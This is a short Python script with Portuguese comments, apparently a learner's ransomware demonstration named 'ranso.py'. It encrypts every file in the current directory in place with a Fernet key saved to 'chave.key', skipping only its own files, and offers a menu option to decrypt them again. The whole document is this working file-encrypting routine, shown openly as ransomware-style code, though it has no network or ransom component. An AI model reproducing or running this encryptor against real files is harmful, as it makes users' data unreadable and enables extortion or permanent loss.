import os
from cryptography.fernet import Fernet

# o algoritmo Fernet usa cryptography AES ou seja ele usa somente uma chave 

#lista de arquivos
files = []


#chave
key =  Fernet.generate_key();


# função para encriptografar
def Encrypted():
    
    #guarda a chave em um arquivo
    with open("chave.key","wb") as chave:
        chave.write(key)

    #pecorre ao diretorio para verificar os arquivos 
    for file in os.listdir():
        

        if(file == "ranso.py" or file == "chave.key" or file == "ransolimpa.py" or file  == "ranso"):
            continue;

        # se for aquivo coloca na lista files
        if(os.path.isfile(file)):
            files.append(file)


    #criando o loop para encryptografar dado por dado
    for file in files:
        with open(file,"rb") as arquivo:
            conteudo = arquivo.read()
        
        conteudo_eencrypted = Fernet(key).encrypt(conteudo)

        with open(file,"wb") as arquivo:
            arquivo.write(conteudo_eencrypted)
    
    print("arquivo Encriptografado")


# função para descriptografar 
def Descrypted():
    # pega a chave do arquivo
    with open("chave.key", "rb") as chave:
        secretkey = chave.read();


    #pecorre ao diretorio para verificar os arquivos 
    for file in os.listdir():
    
    # excluindo arquivos que não é para descriptografar
        if(file == "ranso.py" or file == "chave.key" or file == "ransolimpa.py"):
            continue;

    # se for aquivo vai para a lista
        if(os.path.isfile(file)):
            files.append(file)


    #criando o loop para descriptografar dado por dado
    for file in files:
        with open(file,"rb") as arquivo:
            conteudo = arquivo.read()
    
        conteudo_decrypted = Fernet(secretkey).decrypt(conteudo)

        with open(file,"wb") as arquivo:
            arquivo.write(conteudo_decrypted)
            
    print("arquivo descriptografado")




def main():
    print("1: encryptografar ")
    print("2: descryptografar \n")

    escolha = int(input("escolha sua opcao: "))

    if(escolha == 1):
        Encrypted()
    
    elif(escolha == 2):
        Descrypted()
        
        

main()